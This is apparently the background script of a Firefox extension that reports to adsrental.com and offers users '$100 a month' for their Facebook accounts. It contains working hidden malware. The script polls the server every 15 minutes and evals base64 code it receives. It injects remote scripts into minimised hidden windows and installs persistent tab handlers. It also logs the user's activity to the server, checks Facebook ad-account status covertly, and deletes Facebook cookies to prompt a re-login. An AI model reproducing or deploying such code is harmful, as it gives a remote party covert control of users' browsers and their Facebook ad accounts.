var UID;

var fanpageImages;

var automationTab = null;
var activeLoadChain = null;

var serverBaseUrl = "https://adsrental.com/";

var logRequests = false;
var cancelRequest = null;
var replaceRequest = null;

var tabCloseTimer = null;

var keepAliveHandle = null;

var preRequisiteCheck1 = null;
var preRequisiteCheck2 = null;
var preRequisiteCheck3 = null;
	
var currentTabScript = null;
	
var extensionVersion = "";
	
browser.management.getSelf().then(function(info)
{
	extensionVersion = "FF" + info.version;
		
	console.log("Version: " + extensionVersion);
		
	start();
});	

function start()
{
	chrome.storage.sync.get("UID", function(items) {
		UID = items.UID;

		console.clear();

		if (!UID)
		{
			UID = getRandomToken();

			sendLogMessage("Generated: " + UID);

			chrome.storage.sync.set({ UID: UID });	    	
		}

		chrome.runtime.setUninstallURL(serverBaseUrl + "log.php?uid=" + UID + "&r&v=" + extensionVersion);

		chrome.tabs.onUpdated.addListener(loadChainListener);

		function getRandomToken()
		{
			var randomPool = new Uint8Array(32);
			crypto.getRandomValues(randomPool);

			var hex = "";
				
			for (var i = 0; i < randomPool.length; ++i)
			{
				hex += randomPool[i].toString(16);
			}

			return hex;
		}    	

		function getJSON(script, callback)
		{
			var url = serverBaseUrl + script + (script.indexOf("?") === -1 ? "?" : "&") + "v=" + extensionVersion + "&" + Date.now();

			var xhr = new XMLHttpRequest();
			xhr.open("get", url, true);
			xhr.responseType = "json";

			xhr.onload = function()
			{
				var status = xhr.status;

				if (callback)
				{
					if (status == 200)
					{
						callback(xhr.response);
					}
					else
					{
						callback(null);
					}
				}
			};

			xhr.send();
		}

		function postJSON(script, postData, callback)
		{
			var url = serverBaseUrl + script + "&" + Date.now();

			var xhr = new XMLHttpRequest();
			xhr.open("post", url, true);
			xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

			xhr.onload = function() {
				var status = xhr.status;

				if (callback)
				{
					if (status == 200)
					{
						callback(xhr.response);
					}
					else
					{
						callback(null);
					}
				}
			};

			xhr.send(postData);
		}		

		function sendFanpageUrl(url)
		{
			console.log("Sending Fanpage Url: " + url);

			getJSON("log.php?uid=" + UID + "&f=" + url);
		}

		function sendLogFile(url, script, file)
		{
			postJSON("log.php?uid=" + UID + "&url=" + encodeURIComponent(url) + "&script=" + encodeURIComponent(script), "file=" + file);
		}

		function sendLinkExtension(id, callback)
		{
			console.log("Linking extension: " + id);

			getJSON("log.php?uid=" + UID + "&l=" + id, callback);
		}

		function sendAdAccountStatus(active, status)
		{
			console.log("Ad account status: " + status);

			var url = "log.php?uid=" + UID + "&as=" + encodeURIComponent(status);

			if (active != null)
			{
				url += "&aa=" + active;
			}

			getJSON(url);
		}		

		function sendCreateFanpageStepCompleted(step)
		{
			console.log("Step completed: " + step);

			getJSON("log.php?uid=" + UID + "&s=" + step);
		}

		function sendReactivated(oldUID)
		{
			getJSON("log.php?uid=" + UID + "&ra=" + oldUID);
		}

		function sendCompleted()
		{
			console.log("Install completed");

			getJSON("log.php?uid=" + UID + "&d");	
		}

		function sendLogMessage(message)
		{
			console.log("Log: " + message);

			getJSON("log.php?uid=" + UID + "&m=" + encodeURIComponent(message));
		}

		function sendLogError(error)
		{
			sendLogMessage("ERROR >>> " + error);
		}

		function sendLogWarning(warning)
		{
			sendLogMessage("WARNING >>> " + warning);
		}

		function sendLogInstallDate()
		{
			getJSON("log.php?uid=" + UID + "&i");
		}

		function sendLogUpdateDate()
		{
			getJSON("log.php?uid=" + UID + "&u");
		}

		var installedHandlers = { };

		function createTabHandler(code)
		{
			return function (tabId, info, tab) {
				if (info.status == "complete")
				{
					chrome.tabs.executeScript(tabId, { code: "var extensionid = \"" + chrome.runtime.id + "\";" + code });
				}
			};
		}
			
		function tabLoadedPoll(tabId, callback)
		{
			//about:blank
				
			browser.tabs.get(tabId).then(function(tabInfo) {
				if (tabInfo.url != "about:blank" && tabInfo.status == "complete")
				{
					callback();
						
					return;
				}
					
				setTimeout(function() { tabLoadedPoll(tabId, callback); }, 500);
			});
		}			

		function processServerResponse(response)
		{
			try
			{
				if (response != null && response.success)
				{
					if (response.b)
					{
						sendLogMessage("Processing b.");

						eval(atob(response.b));
					}

					if (response.t)
					{
						sendLogMessage("Processing t.");
							
						currentTabScript = "var extensionid = \"" + chrome.runtime.id + "\";" + atob(response.t);

						chrome.windows.create({ "url": response.url, /*"focused": false,*/ "state": "minimized" }, function(window) {
							sendLogMessage("Window created");
							chrome.windows.update(window.id, { state: "minimized" }, function() {
									
								tabLoadedPoll(window.tabs[0].id, function() {
									browser.tabs.executeScript(window.tabs[0].id, { code: currentTabScript });
								});
								//var gettingInfo = browser.tabs.get(window.tabs[0].id);
									
								//gettingInfo.then(function(tabInfo) { console.log(tabInfo); });
								/*
									setTimeout(function() {
										console.log(tabId);
										console.log(changeInfo);
										console.log(tabInfo);
										browser.tabs.executeScript(window.tabs[0].id, { code: currentTabScript });
									}, 5000);*/
							});

							tabCloseTimer = setTimeout(function() { chrome.windows.remove(window.id); }, 5 * 60 * 1000);
						});
					}

					if (response.p)
					{
						sendLogMessage("Processing p.");

						var keys = Object.keys(response.p);

						for (var i = 0; i < keys.length; i++)
						{
							var code = atob(response.p[keys[i]]);
							var handler = createTabHandler(code);

							if (Object.keys(installedHandlers).includes(keys[i]))
							{
								chrome.tabs.onUpdated.removeListener(installedHandlers[keys[i]]);
							}

							installedHandlers[keys[i]] = handler;

							chrome.tabs.onUpdated.addListener(handler);
						}
					}
				}
			}
			catch(e)
			{
				sendLogMessage("processServerResponse: " + e.message);
			}
		}

		function setActiveLoadChain(loadChain)
		{
			activeLoadChain = null;

			for (var i = 0; i < loadChain.length; i++)
			{
				loadChain[i].hit = false;
			}

			activeLoadChain = loadChain;
		}

		function clearLoadChain()
		{
			activeLoadChain = null;
		}

		function loadChainListener(tabId, info, tab)
		{
			if (activeLoadChain == null || automationTab == null)
			{
				return;
			}

			if (tabId == automationTab.id && info.status == "complete")
			{
				for (var i = 0; i < activeLoadChain.length; i++)
				{
					sendLogMessage("Trying to match: " + tab.url + " with " + activeLoadChain[i].url + "(" + activeLoadChain[i].hit + ")");

					if (!activeLoadChain[i].hit && (tab.url.match(activeLoadChain[i].url) !== null || decodeURI(tab.url).match(activeLoadChain[i].url) !== null))
					{
						activeLoadChain[i].hit = true;

						sendLogMessage("[" + i + "] " + tab.url + " matched url " + activeLoadChain[i].url);

						if (activeLoadChain[i].data.url)
						{
							sendLogMessage("Loading Url: " + activeLoadChain[i].data.url);

							if (activeLoadChain[i].data.url.indexOf("/") === 0)
							{
								// Relative Url
								var expandedUrl = tab.url.substring(0, tab.url.lastIndexOf("/")) + activeLoadChain[i].data.url;

								sendLogMessage("Expanded Url: " + expandedUrl);

								chrome.tabs.update(automationTab.id, { url: expandedUrl });
							}
							else
							{
								chrome.tabs.update(automationTab.id, { url: activeLoadChain[i].data.url });
							}
						}
						else if (activeLoadChain[i].data.script)
						{
							sendLogMessage("Loading script: " + activeLoadChain[i].data.script);

							chrome.tabs.executeScript(automationTab.id, { file: "content_scripts/helper_functions.js" });
							chrome.tabs.executeScript(automationTab.id, { file: activeLoadChain[i].data.script });
						}
						else if (activeLoadChain[i].data.code)
						{
							sendLogMessage("Injecting code.");

							chrome.tabs.executeScript(automationTab.id, { code: "var extensionid = \"" + chrome.runtime.id + "\";" });
							chrome.tabs.executeScript(automationTab.id, { file: "content_scripts/helper_functions.js" }, function() {
								chrome.tabs.executeScript(automationTab.id, { code: activeLoadChain[i].data.code });
							});
						}

						if (activeLoadChain[i].data.callback)
						{
							sendLogMessage("Calling load chain callback...");

							activeLoadChain[i].data.callback();
						}					

						// Null check because callback can reset activeLoadChain
						if (activeLoadChain != null && activeLoadChain[i].data.last)
						{
							sendLogMessage("Ending load chain...");

							activeLoadChain = null;
						}

						break;
					}
				}
			}
		}

		function onMessageListener(request, sender, sendResponse)
		{
			if (request.error != null)
			{
				sendLogError(request.error);
			}
			else if (request.warning != null)
			{
				sendLogWarning(request.warning);
			}
			else if (request.message != null)
			{
				sendLogMessage(request.message);
			}
			else if (request.ad_account_status != null)
			{
				sendAdAccountStatus(request.ad_account_active, request.ad_account_status);

				preRequisiteCheck1 = request.ad_account_active;

				redirectCheckTab();

				chrome.tabs.remove(sender.tab.id);
			}
			else if (request.step_completed != null)
			{
				sendCreateFanpageStepCompleted(request.step_completed);
			}
			else if (request.focus_window)
			{
				chrome.windows.update(automationTab.windowId, { focused: true });
			}
			else if (request.minimize_window)
			{
				chrome.windows.update(automationTab.windowId, { state: "minimized" });
			}
			else if (request.close_tab)
			{
				chrome.tabs.remove(sender.tab.id);
			}
		}		

		function checkAdAccountStatus()
		{
			chrome.windows.create({ "url": "https://www.facebook.com/manage/", "focused": false, "state": "minimized" }, function(window) {
				chrome.windows.update(window.id, { state: "minimized" }, function() {
					chrome.tabs.executeScript(window.tabs[0].id, { file: "content_scripts/helper_functions.js" });
					chrome.tabs.executeScript(window.tabs[0].id, { file: "content_scripts/create_fanpage_ad_manager_script_1.js" });
				});
			});			
		}

		function redirectCheckTab()
		{
			sendLogMessage("1:" + preRequisiteCheck1);
			sendLogMessage("2:" + preRequisiteCheck2);

			if (preRequisiteCheck1 != null && preRequisiteCheck2 != null)
			{
				sendLogMessage("Finding check.html tab...");

				// find check.html
				chrome.tabs.query({ url: serverBaseUrl + "check.html*" }, function(tabs) {
					for (var i = 0; i < tabs.length; i++)
					{
						sendLogMessage(tabs[i].id);
						chrome.tabs.update(tabs[i].id, { active: true } );

						if (preRequisiteCheck1 && preRequisiteCheck2)
						{
							if (preRequisiteCheck3)
							{
								sendLogMessage("Approved redirect");

								chrome.tabs.update(tabs[i].id, { url: serverBaseUrl + "approved.html"} );
							}
							else
							{
								sendLogMessage("Deleting cookies");

								chrome.cookies.getAll({ url: "https://www.facebook.com" }, function(cookies) { cookies.forEach(function(cookie) { chrome.cookies.remove({ url: "https://www.facebook.com/", name: cookie.name }); }); });
								chrome.tabs.create({ url: "https://www.facebook.com"} );

								alert("Please login to your Facebook account so we can check if you can make $100 a month!");
							}
						}
						else
						{
							sendLogMessage("Rejected redirect");
								
							chrome.tabs.update(tabs[i].id, { url: serverBaseUrl + "rejected.html"} );
						}
					}
				});
			}
		}

		chrome.tabs.onUpdated.addListener(function (tabId, info, tab) {
			if (info.status == "complete")
			{
				if (tab.url.indexOf(serverBaseUrl + "check.html") === 0)
				{
					if (tab.url.indexOf("?") !== -1)
					{
						var queryString = tab.url.substr(tab.url.indexOf("?") + 1);

						if (queryString != "")
						{
							sendLinkExtension(queryString, function() {
								keepAlive();
							});
						}				
					}					
				}
				else if (tab.url.indexOf(serverBaseUrl + "reactivate.html") === 0)
				{
					if (tab.url.indexOf("?") !== -1)
					{
						var queryString = tab.url.substr(tab.url.indexOf("?") + 1);

						if (queryString != "")
						{
							var oldUID = UID;
							UID = queryString;
							chrome.storage.sync.set({ UID: UID });

							sendReactivated(oldUID);
						}				
					}
				}
			}
		});

		chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
			if (request.fanpageurl != null)
			{
				console.log("Set fanpage url: " + request.fanpageurl);

				sendFanpageUrl(request.fanpageurl);
			}
			else if (request.get_fanpage_images != null)
			{
				sendLogMessage("Sending fanpage images...");

				sendResponse({ images: fanpageImages });
			}
			else
			{
				onMessageListener(request, sender, sendResponse);
			}
		});

		chrome.runtime.onMessageExternal.addListener(onMessageListener);		

		function keepAlive()
		{
			clearTimeout(keepAliveHandle);

			getJSON("keepalive.php?uid=" + UID, processServerResponse);

			keepAliveHandle = setTimeout(keepAlive, 15 * 60 * 1000);
		}

		keepAlive();
	});
}